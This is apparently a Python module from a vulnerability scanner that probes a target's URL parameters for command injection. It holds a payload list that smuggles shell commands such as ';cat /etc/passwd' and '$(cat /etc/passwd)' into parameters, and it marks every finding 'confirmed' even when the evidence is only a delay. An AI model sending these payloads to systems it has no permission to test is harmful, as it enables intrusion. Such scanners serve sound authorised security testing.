"""
Command injection scanner module for BoltVulnScanner
"""
import logging
import requests
from typing import List
from urllib.parse import urlencode
import time

from .utils import ScanConfig, Finding, safe_request, requires_consent

logger = logging.getLogger(__name__)

class CommandInjectionScanner:
    """Detect command injection vulnerabilities"""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'BoltVulnScanner/0.1.0'})
        # Command injection payloads for different operating systems
        self.cmd_payloads = [
            # Basic payloads
            ';cat /etc/passwd',
            '|cat /etc/passwd',
            '&cat /etc/passwd',
            '&&cat /etc/passwd',
            ';type C:\\Windows\\system.ini',
            '|type C:\\Windows\\system.ini',
            '&type C:\\Windows\\system.ini',
            '&&type C:\\Windows\\system.ini',
            
            # URL encoded payloads
            '%3Bcat%20%2Fetc%2Fpasswd',
            '%7Ccat%20%2Fetc%2Fpasswd',
            '%26cat%20%2Fetc%2Fpasswd',
            '%26%26cat%20%2Fetc%2Fpasswd',
            
            # Alternative separators
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            
            # Windows payloads
            ';dir C:\\',
            '|dir C:\\',
            '&dir C:\\',
            '&&dir C:\\',
            
            # Time-based payloads (for blind command injection)
            ';sleep 5',
            '|sleep 5',
            '&sleep 5',
            '&&sleep 5',
            ';ping -c 5 127.0.0.1',
            '|ping -c 5 127.0.0.1',
            '&ping -c 5 127.0.0.1',
            '&&ping -c 5 127.0.0.1'
        ]
        
    @requires_consent
    def scan(self) -> List[Finding]:
        """
        Scan for command injection vulnerabilities (requires consent)
        
        Returns:
            List of command injection findings
        """
        logger.info("Starting command injection scan")
        findings = []
        
        # Parse target base URL
        from urllib.parse import urlparse
        parsed = urlparse(self.config.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common parameters that might be vulnerable to command injection
        cmd_params = [
            'ip', 'host', 'domain', 'file', 'filename', 'path', 'cmd', 'command',
            'exec', 'execute', 'ping', 'dir', 'ls', 'cat', 'type', 'echo',
            'shell', 'system', 'eval', 'run', 'script', 'import', 'export',
            'backup', 'restore', 'download', 'upload', 'search', 'query'
        ]
        
        # Test each parameter with each payload
        for param in cmd_params:
            for payload in self.cmd_payloads:
                # Create test URL
                test_params = {param: payload}
                test_url = base_url + '?' + urlencode(test_params)
                
                # Measure response time for time-based payloads
                start_time = time.time()
                response = safe_request(test_url, timeout=self.config.timeout)
                end_time = time.time()
                
                if not response:
                    continue
                    
                response_time = end_time - start_time
                
                # Check for command output in response
                if self._contains_cmd_output(response.text, payload):
                    finding = self._create_finding(
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        response_time=response_time,
                        cmd_output_detected=True
                    )
                    findings.append(finding)
                    
                # Check for time-based command injection
                elif 'sleep' in payload or 'ping' in payload:
                    # If response took significantly longer, it might indicate command execution
                    if response_time > 4.0:  # More than 4 seconds
                        finding = self._create_finding(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response_time=response_time,
                            cmd_output_detected=False
                        )
                        findings.append(finding)
                        
        logger.info(f"Command injection scan completed. Found {len(findings)} potential issues")
        return findings
    
    def _contains_cmd_output(self, response_text: str, payload: str) -> bool:
        """Check if response contains command output"""
        # Check for Linux /etc/passwd signature
        if 'cat /etc/passwd' in payload and ':/bin/' in response_text:
            return True
            
        # Check for Windows system.ini signature
        if 'type C:\\Windows\\system.ini' in payload and ('[boot]' in response_text or '[386Enh]' in response_text):
            return True
            
        # Check for directory listing signatures
        if 'dir C:\\' in payload and ('Directory of' in response_text or 'File(s)' in response_text):
            return True
            
        # Check for general command output patterns
        cmd_indicators = [
            'root:x:',  # /etc/passwd
            '[boot]', '[386Enh]',  # Windows system.ini
            'Directory of', 'File(s)',  # dir output
            'total ', 'drwx', '-rw-',  # ls output
        ]
        
        return any(indicator in response_text for indicator in cmd_indicators)
    
    def _create_finding(self, url: str, parameter: str, payload: str, response_time: float, cmd_output_detected: bool) -> Finding:
        """Create a command injection finding"""
        if cmd_output_detected:
            title = "Command Injection Vulnerability (With Output)"
            severity = "critical"
            cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
            impact = "An attacker could execute arbitrary commands on the server, potentially gaining full control of the system."
            bounty = "$3000-$10000"
        else:
            title = "Potential Command Injection Vulnerability (Time-Based)"
            severity = "high"
            cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
            impact = "An attacker might be able to execute arbitrary commands on the server, potentially leading to system compromise."
            bounty = "$1000-$3000"
            
        poc_content = f"Parameter '{parameter}' with payload '{payload}' caused response time of {response_time:.2f} seconds" if self.config.include_poc else "[REDACTED]"
        
        finding = Finding(
            finding_id=f"CMD-INJECT-{int(time.time() * 1000)}",
            title=title,
            module="cmd_injection",
            url=url,
            parameter=parameter,
            severity=severity,
            cvss_vector=cvss_vector,
            poc=poc_content,
            reproduction_steps=f"1. Navigate to {url}\n2. Observe the response\n3. Note that this indicates a command injection vulnerability",
            impact=impact,
            recommended_fix="Validate and sanitize all user input. Use parameterized commands or APIs instead of shell commands. Implement proper input validation and escaping.",
            suggested_bounty=bounty,
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
            ],
            confirmed=True
        )
        
        return finding